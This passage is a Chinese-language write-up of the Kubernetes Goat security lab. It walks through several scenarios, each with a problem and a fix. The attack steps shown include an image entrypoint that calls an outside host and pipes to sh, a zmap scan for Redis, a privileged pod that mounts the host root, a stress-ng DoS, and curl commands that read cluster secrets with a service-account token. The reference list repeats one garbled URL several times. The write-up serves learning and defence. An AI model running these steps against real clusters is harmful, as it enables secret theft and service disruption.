    spec:
      containers:
        - name: batch-check
          image: madhuakula/k8s-goat-batch-check
          # command:
          #  - "bin/sh"
          #  - "-c"
          #  - "htop"
      restartPolicy: Never
```

发现用的镜像是`madhuakula/k8s-goat-batch-check`

通过`docker history --no-trunc madhuakula/k8s-goat-batch-check`，发现 entrypoint 是`echo "curl -sSL https://madhuakula.com/kubernetes-goat/k8s-goat-a5e0a28fa75bf429123943abedb065d1 && echo 'id' | sh " > /usr/bin/system-startup && chmod +x /usr/bin/system-startup`

### Solution

## Kubernetes namespaces bypass

![bypass](https://madhuakula.com/kubernetes-goat/assets/images/scenario-11-e55c9b80c23a981a44e3ab1175875d2a.png)

### Problem

在容器内部，通过[zmap](https://zmap.io/)，进行扫描，发现了 redis host 的地址，通过 redis-cli 进行了连接，

```
zmap -p 6379 10.0.0.0/8 -o results.csv
```

### Solution

- 配置 k8s 的 network policy
- 中间件(Redis ElasticSeach, Mongo, MySQL)配置密码

## Gaining environment information

### Problem

使用了主机的网络、PID、IPC，将主机的根目录挂载到了 pod 里，并创建了一个 Secret，然后在 pod tty 里执行 mount，

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: goatvault
type: Opaque
data:
  k8sgoatvaultkey: azhzLWdvYXQtY2QyZGEyNzIyNDU5MWRhMmI0OGVmODM4MjZhOGE2YzM=

---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: system-monitor-deployment
spec:
  selector:
    matchLabels:
      app: system-monitor
  template:
    metadata:
      labels:
        app: system-monitor
    spec:
      hostPID: true
      hostIPC: true
      hostNetwork: true
      volumes:
        - name: host-filesystem
          hostPath:
            path: /
      containers:
        - name: system-monitor
          image: madhuakula/k8s-goat-system-monitor
          resources:
            limits:
              memory: "50Mi"
              cpu: "20m"
          securityContext:
            allowPrivilegeEscalation: true
            privileged: true
          ports:
            - containerPort: 8080
          volumeMounts:
            - name: host-filesystem
              mountPath: /host-system
          env:
            - name: K8S_GOAT_VAULT_KEY
              valueFrom:
                secretKeyRef:
                  name: goatvault
                  key: k8sgoatvaultkey
```

## DoS the Memory/CPU resources

### Problem

创建的 deployment，没有设置 resources limit 和 request，然后使用 stress-ng，进行压测，

`stress-ng --vm 2 --vm-bytes 2G --timeout 30s`

## Hacker container preview

![container preview](https://madhuakula.com/kubernetes-goat/assets/images/hacker-container-b57ef1a3e73fc17e35c0e58ce5032750.png)

### Problem

这次使用的还是 hacker-container 的镜像，[amicontained](https://github.com/genuinetools/amicontained)，是一个容器检测工具。
[nikto.pl](https://github.com/sullo/nikto)是一个网页扫描器。

## Hidden in layers

### Problem

通过解析 docker image 发现了隐藏的信息，像下面的例子添加了一个 secret.txt 文件，虽然下面删除了，但是这个文件还是存在在 layer 上

```bash
FROM alpine:latest

LABEL MAINTAINER "Madhu Akula" INFO="Kubernetes Goat"

ADD secret.txt /root/secret.txt

RUN echo "Contributed by Rewanth Cool" >> /root/contribution.txt \
    && rm -rf /root/secret.txt

CMD ["sh", "-c", "tail -f /dev/null"]
```

发现 Dockerfile

```bash
// method1
docker history --no-trunc madhuakula/k8s-goat-hidden-in-layers

// method2
alias dfimage="docker run -v /var/run/docker.sock:/var/run/docker.sock --rm alpine/dfimage"
dfimage -sV=1.36 madhuakula/k8s-goat-hidden-in-layers

// method3
dive madhuakula/k8s-goat-hidden-in-layers
```

查找文件

```
docker save madhuakula/k8s-goat-hidden-in-layers -o hidden-in-layers.tar
tar -xvf hidden-in-layers.tar
tar xvf 4af10e09d93bc72984f41a7f54f6f70ed94d004458609243c802ae6c724169bc.tar
ll root/secret.txt
```

### Solution

Dockerfile 不要带敏感数据

## RBAC least privileges misconfiguration

### Problem

运行这个 deployment 使用的 serviceAccountName 是 big-monolith-sa，这个 sa 赋予了所有资源的 get/watch/list 操作。

```yaml
---
apiVersion: v1
kind: Namespace
metadata:
  name: big-monolith
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: big-monolith
  name: secret-reader
rules:
  - apiGroups: [""] # "" indicates the core API group
    resources: ["*"] # all the resources
    verbs: ["get", "watch", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: secret-reader-binding
  namespace: big-monolith
subjects:
  # Kubernetes service account
  - kind: ServiceAccount
    name: big-monolith-sa
roleRef:
  kind: Role
  name: secret-reader
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: big-monolith-sa
  namespace: big-monolith
```

所以我们可以在 pod 里执行 curl 操作，获取相关信息

```bash
export APISERVER=https://${KUBERNETES_SERVICE_HOST}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
# 获取API
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api
# 获取所有secret
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets
# 获取该namespace下的secret
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets
# 获取所有pod
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/pods
# 获取k8svaultapikey的secret
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets | grep k8svaultapikey
```

### Solution

RBAC 赋权需要最小化

## KubeAudit - Audit Kubernetes clusters

[kubeaudit](https://github.com/Shopify/kubeaudit)检测集群问题。

- run as non-root
- use a read-only root filesystem
- drop scary capabilities, don't add new ones
- don't run privileged

## Falco - Runtime security monitoring & detection

[falco](https://falco.org/)，是一个运行时安全监控和检测工具。

## Popeye - A Kubernetes cluster sanitizer

[Popeye](https://github.com/derailed/popeye)，A Kubernetes cluster resource sanitizer

## Secure network boundaries using NSP

![NSP](https://madhuakula.com/kubernetes-goat/assets/images/scenario-20-67e927c0a31930caec4d269b15e157db.png)

### Problem

首先创建了一个 nginx pod

```bash
kubectl run --image=nginx website --labels app=website --expose --port 80
```

创建了一个 Network Policy，禁止所有流量到有 lable 为 app: website 的 pod 上。

```yaml
kind: NetworkPolicy
apiVersion: networking.k8s.io/v1
metadata:
  name: website-deny
spec:
  podSelector:
    matchLabels:
      app: website
  ingress: []
```

验证

```yaml
kubectl run --rm -it --image=alpine temp -- sh
wget -qO- http://website
```

一个小工具https://editor.cilium.io/，可以在线编辑网络策略

# summary

katacoda 真的不错，所有场景，我都是在 katacoda 上完成的。虽然用起来有一点点卡。也能提供自定义端口进行转发

最后几小节，都是介绍工具，由于没有具体使用过，就不详细介绍了。留个印象，用的时候再去细究。

# Reference

- https://madhuakula.com/kubernetes-goat/docs/scenarios
- https://github.com/madhuakula/kubernetes-goatcenarios
- https://github.com/madhuakula/kubernetes-goatcenarios
- https://github.com/madhuakula/kubernetes-goatcenarios
- https://github.com/madhuakula/kubernetes-goatcenarios
- https://github.com/madhuakula/kubernetes-goatcenarios
- https://github.com/madhuakula/kubernetes-goat
